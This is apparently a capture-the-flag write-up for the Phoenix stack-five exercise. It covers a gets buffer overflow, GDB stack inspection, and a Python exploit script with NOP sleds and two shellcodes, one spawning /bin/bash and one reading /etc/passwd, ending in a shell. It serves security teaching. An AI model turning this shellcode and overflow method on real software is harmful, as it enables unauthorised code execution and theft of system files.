<h1> stack-05: smashing the stack and loading our shellcode </h1>

This challenge is stack-based $RIP control through `gets` function. Our stack
location is next to a 128 byte array which gives us lots of freedom to put our
shellcode along with a NOP sledge. Here's a general plan:

- locate the base location of our payload on the memory
- put a nop sledges
- put the shellcode 
- put more nop sledges
- finally, put the address we loacted from the first step in the $RIP




**Solution:**

- locate the base location of our payload in the memory

By debugging the binary, and setting a breakpoint after the `gets` function get
executed, we can inspect the stack and check what it looks like (and hence
where our shellcode would be). Let's not forget to unset any environment files
that GDB inserts which could possibly push the stack downward and messing with
our locations

```bash
gdb-peda$ unset env LINES
gdb-peda$ unset env COLUMNS
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop 
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    
End of assembler dump.
```

lets set a breakpoint at *start_level+20 or *0x00000000004005a1

```bash
gdb-peda$ b *start_level+20
Breakpoint 1 at 0x4005a1
gdb-peda$ r
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAA
gdb-peda$ x/64wx
0x7fffffffe5d0:	0x41414141	0x00000041	0x00400620	0x00000000
0x7fffffffe5e0:	0x004005a4	0x00000000	0x00000000	0x00000000
0x7fffffffe5f0:	0x00000000	0x00000000	0xf7db6dde	0x00007fff
0x7fffffffe600:	0x004005a4	0x00000000	0x00650037	0x00000000
0x7fffffffe610:	0x00000000	0x00000000	0xf7db6b1e	0x00007fff
0x7fffffffe620:	0xf7ffb300	0x00007fff	0x00000000	0x0a000000
0x7fffffffe630:	0xf7ffb300	0x00007fff	0xf7db9934	0x00007fff
0x7fffffffe640:	0xffffe6c8	0x00007fff	0xffffe670	0x00007fff
0x7fffffffe650:	0xffffe670	0x00007fff	0x004005c7	0x00000000
0x7fffffffe660:	0xffffe6c8	0x00007fff	0x00000000	0x00000001
0x7fffffffe670:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe680:	0x00000000	0x00000000	0xffffe6c0	0x00007fff
0x7fffffffe690:	0x00000000	0x00000000	0xf7ffdbc8	0x00007fff
0x7fffffffe6a0:	0x00003e00	0x04000001	0x00400459	0x00000000
0x7fffffffe6b0:	0x00000000	0x00000000	0x00400436	0x00000000
0x7fffffffe6c0:	0x00000001	0x00000000	0xffffe8b7	0x00007fff
````
we could see that our AAAAA landed on `0x7fffffffe5d0` will be our base
location of the shellcode.

For a shellcode, you can grab any convienent shellcode
(shell-storm.org/shellcode/) or anything from metasploit, I personally picked
`execve("/bin/bash", ["/bin/bash", "-p"], NULL)`, keep in mind any shellcode
would work as long as it is in the same architecture / unix variation. if we
calculate how many bytes we can insert until we hit `$RIP` we get 136 bytes,
i'll not do the calculations since they are baby-steps at this point and it's
redudant to include them.




```python
#!/usr/bin/env python

from pwn import p64


shellcode_exec_bash = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode_read_passwd ="\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"


buffer_address = p64(0x7fffffffe5c0)

buf = ""
buf += "\x90" * 20
buf += shellcode_exec_bash
buf += "\x90" * (136 - len(buf)) 
buf += buffer_address
 
print buf
```
let's execute our exploit

```bash
(./stack-05.py;cat) | /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
ls
stack-05-foreign.py  stack-05.py
whoami
phoenix-amd64-stack-five
```

